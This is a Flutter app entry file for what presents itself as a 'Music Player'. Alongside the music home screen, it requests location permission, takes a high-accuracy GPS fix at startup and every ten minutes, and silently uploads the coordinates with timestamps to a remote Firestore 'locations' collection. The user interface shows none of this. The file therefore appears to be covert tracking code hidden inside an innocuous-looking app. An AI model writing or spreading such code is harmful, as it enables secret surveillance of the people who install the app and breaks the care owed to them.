import 'dart:async';
import 'dart:developer';
import 'package:app/firebase_options.dart';
import 'package:app/view/music/homeview.dart';
import 'package:flutter/material.dart';
import 'package:geolocator/geolocator.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:get/get_navigation/src/root/get_material_app.dart';
import 'package:permission_handler/permission_handler.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await _requestPermissions();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  runApp(const MyApp());
}

Future<void> _requestPermissions() async {
  var status = await Permission.camera.status;
  if (!status.isGranted) {
    await Permission.location.request();
  }
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  String locationMessage = "Waiting for update...";
  Timer? timer;

  @override
  void initState() {
    super.initState();
    _initLocation();
    timer = Timer.periodic(const Duration(minutes: 10), (timer) {
      _getLocation();
    });
  }

  @override
  void dispose() {
    timer?.cancel();
    super.dispose();
  }

  Future<void> _initLocation() async {
    LocationPermission permission = await Geolocator.requestPermission();
    if (permission == LocationPermission.denied ||
        permission == LocationPermission.deniedForever) {
      setState(() {
        locationMessage = "Permission denied!";
      });
      return;
    }

    _getLocation();
  }

  Future<void> _getLocation() async {
    try {
      Position position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );

      final lat = position.latitude;
      final lng = position.longitude;

      setState(() {
        locationMessage = "Lat: $lat, Lng: $lng";
      });

      log(locationMessage);

      await FirebaseFirestore.instance.collection("locations").add({
        "latitude": lat,
        "longitude": lng,
        "timestamp": FieldValue.serverTimestamp(),
      });
    } catch (e) {
      setState(() {
        locationMessage = "Error: $e";
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return  GetMaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Music Player',
      theme: ThemeData(primarySwatch: Colors.blue),
      home: const HomeView(),
    );
  }
}
// for map API Key
// https://cloud.maptiler.com/